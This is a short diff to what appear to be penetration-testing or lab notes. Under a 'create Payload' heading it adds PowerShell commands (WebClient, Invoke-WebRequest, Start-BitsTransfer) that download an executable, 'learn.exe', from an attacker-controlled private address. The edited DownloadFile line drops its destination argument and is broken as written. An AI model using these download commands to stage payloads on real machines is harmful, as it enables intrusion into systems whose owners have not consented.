@@ -14,6 +14,13 @@ create powershell in windows
  
  ## create Payload
  
- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.249.117:8001/learn.exe','learn.exe')"
+ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.249.117:8001/learn.exe')"
+ 
+ invoke-webrequest -Uri "http://10.8.249.117:8001/learn.exe"
+ 
+
+Start-BitsTransfer -Source "http://10.8.249.117:8001/learn.exe"
+
+
  
  
